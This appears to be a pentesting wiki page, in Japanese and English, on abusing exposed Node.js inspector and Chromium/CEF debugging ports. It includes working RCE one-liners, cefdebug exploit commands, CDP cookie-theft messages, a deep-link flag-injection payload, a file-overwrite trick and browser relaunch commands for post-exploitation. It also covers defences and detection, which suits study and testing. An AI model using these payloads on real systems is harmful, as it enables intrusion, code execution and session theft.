# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

過去の実践例には、Multimaster walkthrough と CVE-2019-1414 Visual Studio Code debugger attack が含まれます。これらはバージョン固有のコンテキストとして利用し、現在のすべての Electron または Chromium target が同じ primitive を公開していると想定しないでください。<sup>[[1]](#references)[[3]](#references)</sup>

## Basic Information

[docsより](https://nodejs.org/learn/getting-started/debugging)：`--inspect` switch を指定して起動すると、Node.js process は debugging client からの接続を待ち受けます。**default** では、host **`127.0.0.1:9229`** で待ち受けます。各 process には **unique** な **UUID** も割り当てられます。<sup>[[4]](#references)</sup>

Inspector client は、接続するために host address、port、UUID を把握し、指定する必要があります。完全な URL は、`ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` のようになります。<sup>[[4]](#references)</sup>

> [!WARNING]
> **debugger は Node.js execution environment に完全にアクセスできる**ため、この port に接続できる malicious actor は、Node.js process の権限で任意の code を実行できる可能性があります（**potential privilege escalation**）。<sup>[[4]](#references)</sup>

Inspector を起動する方法はいくつかあります：<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
検査対象のプロセスを起動すると、次のようなものが表示されます：<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF**（**Chromium Embedded Framework**）ベースのプロセスでは、`--remote-debugging-port=9222` により debugger を公開できます。これにより、Node.js inspector ではなく [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) を介して browser が公開されるため、Node.js の `process` ベースの payload は、デフォルトでは直接適用できません。<sup>[[2]](#references)[[5]](#references)</sup>

debug 対象の browser を起動すると、次のような内容が表示されます：<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### CDP endpoint の列挙と操作

HTTP discovery endpoints は、**browser** WebSocket と個々の **target**（tab、worker、extension など）の WebSocket を区別します。browser endpoint には `/json/version`、targets には `/json/list` をクエリします。返された `webSocketDebuggerUrl` の値を使うことで、CDP の JSON-RPC-like messages を介して直接操作できます。<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
たとえば、`websocat "$BROWSER_WS"` で接続し、`{"id":1,"method":"Target.getTargets"}` または `{"id":2,"method":"Storage.getCookies"}` を送信します。page target（`websocat "$PAGE_WS"`）では、`Runtime.evaluate` がその renderer 内で実行され、`Page.captureScreenshot` は base64-encoded screenshot を返します。`document.cookie` では `HttpOnly` cookies を明らかにできませんが、`Storage.getCookies` は browser に cookie store を要求します。<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### ブラウザ、WebSockets、same-origin-policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Web-browserで開かれたWebサイトは、ブラウザのセキュリティモデルに従ってWebSocketおよびHTTPリクエストを実行できます。**一意のdebugger session idを取得する**には、**初期HTTP接続**が必要です。**same-origin-policy**により、Webサイトが**このHTTP接続**を実行することは**防止されます**。さらに[**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**、**に対するセキュリティを強化するため、Node.jsは接続の**'Host' headers**が**IP address**または正確に**`localhost`**を指定していることを検証します。<sup>[[4]](#references)</sup>

> [!TIP]
> この**セキュリティ対策により、**（SSRF vulnを悪用すれば可能な）**HTTP requestを送信するだけ**でinspectorをexploitしてコードを実行することが防止されます。<sup>[[4]](#references)</sup>

### 実行中のprocessesでinspectorを開始する

実行中のnodejs processに**signal SIGUSR1**を送信すると、default portで**inspectorを開始**させることができます。ただし、十分なprivilegesが必要であるため、これは**process内部の情報へのprivileged access**を与える可能性はありますが、直接的なprivilege escalationにはなりません。<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> これは containers で役立ちます。プロセスとともに **container** も **kill** されるため、`--inspect` を付けて **プロセスを停止し、新しいプロセスを起動すること**は **選択肢にならない**からです。<sup>[[6]](#references)</sup>

### inspector/debugger に接続する

**Chromium-based browser** に接続するには、Chrome または Edge でそれぞれ `chrome://inspect` または `edge://inspect` の URL にアクセスできます。Configure ボタンをクリックし、**対象ホストとポート**が正しく一覧表示されていることを確認します。画像は Remote Code Execution (RCE) の例を示しています。<sup>[[2]](#references)[[4]](#references)</sup>

![debugger にアクセスするための URL が表示されます。例: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger に接続する: Chromium-based browser に接続するには、...](<../../images/image (674).png>)

**command line** を使用すると、次のように debugger/inspector に接続できます。<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
ツール [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) を使用すると、ローカルで実行中の **inspectors** を**検索**し、そこへ**コードを注入**できます。<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> ブラウザに [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 経由で接続している場合、**NodeJS RCE exploits** は機能しないことに注意してください（興味深い操作方法を見つけるには API を確認する必要があります）。<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector における RCE

> [!TIP]
> [**Electron の XSS から RCE を取得する方法を探している場合は、このページを確認してください。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Node **inspector** に **接続** できる場合に **RCE** を取得する一般的な方法としては、次のようなものを使用します（**Chrome DevTools protocol** への接続では機能しないようです）。<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

APIは[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)で確認できます。<sup>[[5]](#references)</sup>
このセクションでは、このprotocolを悪用するために人々が使用した興味深い手法を列挙します。

### Chrome 136+ default-profile restriction

**Chrome 136**以降、**default Chrome data directory**を対象とする場合、Chromeは`--remote-debugging-port`と`--remote-debugging-pipe`を無視します。このswitchには、標準とは異なる`--user-data-dir`を組み合わせる必要があります。これにより、個別の暗号化キーと分離されたbrowser stateが使用されるため、単純なflag-based techniqueによってユーザーの通常のauthenticated profileが露出するのを防げます。このChrome固有のrestrictionが、検証なしに古いChrome builds、Chrome for Testing、Electron/CEF applications、その他のChromium derivativesにも適用されると想定してはなりません。<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
したがって、`--remote-debugging-port` のみを指定して起動された現在の Chrome process を見ても、CDP が active になったことの証明には**なりません**。listener と `/json/version` を確認し、実際にどの profile がその listener の基盤になっているかを特定してください。<sup>[[14]](#references)</sup>

### Deep Links経由のParameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) では、Rhino security が、CEF ベースの application がシステムにカスタム URI（workspaces://index.html）を**登録**しており、その URI 全体を受け取った後、その URI から部分的に構築した configuration で CEF ベースの application を**起動**していることを発見しました。<sup>[[8]](#references)</sup>

URI の parameters が URL decoded され、CEF ベースの application の起動に使用されていることが発見されました。これにより、user は **command line** に flag **`--gpu-launcher`** を**inject**し、任意の処理を実行できました。<sup>[[8]](#references)</sup>

そのため、次のような payload は:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exeを実行します。<sup>[[8]](#references)</sup>

### ファイルの上書き

**downloaded files are going to be saved** フォルダーを変更し、ファイルをダウンロードして、アプリケーションで頻繁に使用される **source code** を**悪意のあるコード**で上書きします。<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE と exfiltration

STAR Labs は、公開された WebDriver/CDP services により arbitrary file reads と RCE が可能になり、一部の構成では DNS rebinding によって exploit chain を完了できることを示しました。<sup>[[9]](#references)</sup>

過去の browser-automation および Chromium security cases については、Counter WebDriver write-up と Project Zero issues 773、1742、1944 も参照してください。<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### 稼働中の Chromium process 内で CDP を有効化する

Windows では、[**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) により、command-line restriction が CDP を有効化する唯一の方法ではないことが示されました。既存の `msedge.exe` に inject できる code は、Chromium の non-exported `content::DevToolsAgentHost::StartRemoteDebuggingServer` を呼び出し、browser を再起動せずに authenticated live profile を公開できます。<sup>[[15]](#references)</sup>

実証された chain では、`VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` により DLL を inject し、internal Edge symbols を解決し（最初は PDBs から、その後は version-specific byte signatures を使用）、browser window を subclass 化し、message を post して最終的な server-start call が browser の **UI thread** 上で実行されるようにします。socket は loopback に bind され、その後、通常の CDP primitives により cookies の取得、tabs の capture、network traffic の inspection、authenticated pages 上での JavaScript の evaluate が可能になります。<sup>[[15]](#references)</sup>

> [!WARNING]
> これは **post-compromise/process-injection** technique であり、unauthenticated network bypass ではありません。関連する C++ symbols は exported されておらず、browser updates 後に signatures が変更される可能性があるため、build への依存度が高い technique です。<sup>[[15]](#references)</sup>

Detection では、`--remote-debugging-*` command-line telemetry だけに依存しないでください。browser processes に対する unusual handles と memory operations（`PROCESS_VM_OPERATION`、`PROCESS_VM_WRITE`、thread creation）、DLL injection、Chrome/Edge が所有する予期しない loopback listening sockets も相関させてください。<sup>[[15]](#references)</sup>

### Post-Exploitation

実環境で、Chromium-based browser を使用する user PC を **compromising した後** に、過去の technique として debugging を有効にして browser を relaunch し、loopback port を forward する方法がありました。これは、選択した profile を引き続き受け入れる products/builds では victim の browsing state を公開する可能性がありますが、Chrome 136+ では default data directory に対してこの方法は受け入れられません。<sup>[[7]](#references)[[14]](#references)</sup>

元の relaunch command は、older/version-specific targets 向けに以下に残しています。2 番目の command は supported current-Chrome form ですが、victim の通常の authenticated state を再び開くのではなく、isolated profile を作成します。<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
macOS固有のChromiumの再起動、extension、CDPのtradecraftについては、[macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md)を参照してください。



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debuggerの検査およびexploit用tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger経由のVisual Studio Code Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Getting Started](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: ChromeのDebugging機能をAbuseしてBrowsing Sessionをリモートから監視および制御する](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS RebindingおよびCDP経由のWebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - BotからRCEへ](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [remote debugging switchの変更によるsecurityの向上 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [実行中のEdge BrowserへのCDPのInject: Runtime Browser Instrumentationの詳細解説](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
